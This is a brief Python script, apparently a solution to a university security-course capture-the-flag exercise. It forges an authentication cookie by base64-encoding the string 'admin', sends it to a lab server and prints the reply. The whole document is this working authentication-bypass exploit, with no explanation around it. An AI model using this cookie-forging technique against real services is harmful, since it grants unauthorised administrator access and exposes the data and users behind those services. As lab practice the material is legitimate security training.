import requests
import base64

URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22056/"

adminEncoded = base64.b64encode(b"admin").decode("utf-8")
r = requests.get(URL, cookies={'user': adminEncoded})
print(r.text)